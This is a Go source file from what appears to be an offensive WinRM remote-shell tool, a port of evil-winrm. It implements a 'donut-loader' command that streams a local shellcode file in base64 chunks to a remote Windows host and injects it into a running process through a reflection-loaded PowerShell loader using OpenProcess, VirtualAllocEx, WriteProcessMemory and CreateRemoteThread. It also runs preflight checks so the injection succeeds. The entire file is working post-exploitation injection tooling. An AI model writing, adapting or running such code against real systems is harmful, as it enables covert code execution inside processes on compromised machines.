package shell

import (
	"context"
	_ "embed"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/sresarehumantoo/wsmancer/internal/output"
)

// donutLoaderFunc is the PowerShell wrapper that defines Donut-Loader in the
// runspace. It reflection-loads an embedded x64 .NET assembly
// (ShellcodeTest.Program) which base64-decodes shellcode and injects it into
// another process the classic way, OpenProcess, VirtualAllocEx,
// WriteProcessMemory, CreateRemoteThread. Ported verbatim from Ruby evil-winrm's
// CyberVaca payload (based on TheWover's donut) so the proven loader is
// unchanged; the wrapper itself refuses to run on an x86 process.
//
//go:embed assets/donut-loader.ps1
var donutLoaderFunc string

// donutVar is the global that holds the base64 shellcode while it is streamed to
// the target in envelope-sized chunks. Upstream inlines the whole base64 into a
// single command, which a donut payload of any real size overruns
// (MaxEnvelopeSizekb); chunking through sendB64Var is this port's fix.
const donutVar = "__ewdonut"

const cleanupDonutVar = `Remove-Variable ` + donutVar + ` -Scope Global -ErrorAction SilentlyContinue`

// donutLoader implements `donut-loader -process_id <pid> -donutfile <local .bin>`:
// read a local donut shellcode blob, stream it to the target as base64, and
// inject it into an existing remote process. x64 targets only, the wrapper says
// so itself rather than injecting garbage into a WOW64 process.
func (sh *Shell) donutLoader(ctx context.Context, sigs <-chan os.Signal, line string) error {
	pid, file, err := parseDonutArgs(splitArgs(line)[1:])
	if err != nil {
		return err
	}

	data, err := os.ReadFile(file)
	if err != nil {
		return err
	}
	if len(data) == 0 {
		return fmt.Errorf("%s is empty", file)
	}

	target, err := sh.preflight(ctx, pid)
	if err != nil {
		return err
	}
	if err := sh.ensureDonutLoader(ctx); err != nil {
		return err
	}

	b64 := base64.StdEncoding.EncodeToString(data)
	if err := sh.sendB64Var(ctx, sigs, donutVar, b64); err != nil {
		_, _ = sh.s.RunRaw(ctx, cleanupDonutVar)
		return fmt.Errorf("sending %s: %w", filepath.Base(file), err)
	}
	defer func() { _, _ = sh.s.RunRaw(ctx, cleanupDonutVar) }()

	sh.log.Event("[donut-loader] %s (%d bytes) -> pid %s (%s)", file, len(data), pid, target)
	// The loader prints nothing on success, so say what was done, otherwise a
	// successful injection and a silent no-op look identical.
	if !sh.json {
		fmt.Fprintf(sh.out, "%s injecting %d bytes into pid %s (%s)\n",
			sh.c.Blue("Info:"), len(data), pid, target)
	}
	return sh.executeAs(ctx, sigs, donutCommand(pid), "donut-loader "+filepath.Base(file)+" -> pid "+pid)
}

// donutCommand builds the Donut-Loader call. The shellcode is passed by variable
// reference rather than inline; pid is known to be digits (parseDonutArgs
// enforces it), so neither argument can break out of the command.
func donutCommand(pid string) string {
	return fmt.Sprintf("Donut-Loader -process_id %s -donutfile $global:%s", pid, donutVar)
}

const donutUsage = `usage: donut-loader -process_id <pid> -donutfile <local .bin>   (x64 targets only)`

// parseDonutArgs accepts upstream evil-winrm's flag form in either order, and a
// positional `donut-loader <pid> <file>` shorthand. Flag names are matched
// case-insensitively because PowerShell's own parameter binding is.
func parseDonutArgs(args []string) (pid, file string, err error) {
	switch {
	case len(args) == 0:
		return "", "", errors.New(donutUsage)
	case len(args) == 2 && !strings.HasPrefix(args[0], "-") && !strings.HasPrefix(args[1], "-"):
		// Positional shorthand. Neither word may look like a flag, or a
		// half-converted `donut-loader 3312 -donutfile` would be read as a file
		// named "-donutfile" and reported as a missing-file error.
		pid, file = args[0], args[1]
	case len(args) == 4:
		for i := 0; i < 4; i += 2 {
			switch strings.ToLower(args[i]) {
			case "-process_id":
				pid = args[i+1]
			case "-donutfile":
				file = args[i+1]
			default:
				return "", "", fmt.Errorf("unknown argument %q\n%s", args[i], donutUsage)
			}
		}
	default:
		return "", "", errors.New(donutUsage)
	}

	if pid == "" || file == "" {
		return "", "", errors.New(donutUsage)
	}
	// The pid is interpolated into the remote command, so it must be plain
	// digits, both to keep the command injection-free and because a typo'd pid
	// is worth catching before shipping a payload over the wire. ParseUint
	// rather than Atoi: Atoi accepts a leading sign, so "+3312" would reach the
	// wire despite the digits-only invariant claimed here.
	if n, convErr := strconv.ParseUint(pid, 10, 32); convErr != nil || n == 0 {
		return "", "", fmt.Errorf("process id must be a positive number, got %q", pid)
	}
	return pid, file, nil
}

// preflight checks the two things that make an injection pointless before the
// payload is streamed: a 32-bit runspace (the loader is x64-only, and its own
// guard can only complain *after* the whole upload) and a pid that isn't
// running (the loader is silent in that case, so without this the operator gets
// no output at all and cannot tell success from a typo). It returns the target
// process name, which the caller echoes as confirmation.
//
// A probe whose answer can't be parsed is not treated as failure, better to let
// the wrapper decide than to block on a quirk of the target's formatting.
func (sh *Shell) preflight(ctx context.Context, pid string) (string, error) {
	probe := fmt.Sprintf(
		`$p = Get-Process -Id %s -ErrorAction SilentlyContinue; '{0}|{1}' -f [IntPtr]::Size, $p.ProcessName`, pid)
	res, err := sh.s.RunRaw(ctx, probe)
	if err != nil {
		return "", err
	}
	for _, v := range res.Output {
		size, name, ok := strings.Cut(strings.TrimSpace(output.Text(v)), "|")
		if !ok {
			continue
		}
		if size == "4" {
			return "", errors.New("the target runspace is 32-bit; donut-loader injects x64 shellcode and works only from an x64 session")
		}
		if name == "" {
			return "", fmt.Errorf("no process with id %s is running on the target", pid)
		}
		return name, nil
	}
	return "", nil
}

// ensureDonutLoader defines the Donut-Loader function in the runspace on first
// use. The single runspace persists, so it is loaded at most once per session.
func (sh *Shell) ensureDonutLoader(ctx context.Context) error {
	if sh.donutLoaderLoaded {
		return nil
	}
	if err := sh.defineRemoteFunc(ctx, "Donut-Loader", donutLoaderFunc); err != nil {
		return err
	}
	sh.donutLoaderLoaded = true
	return nil
}
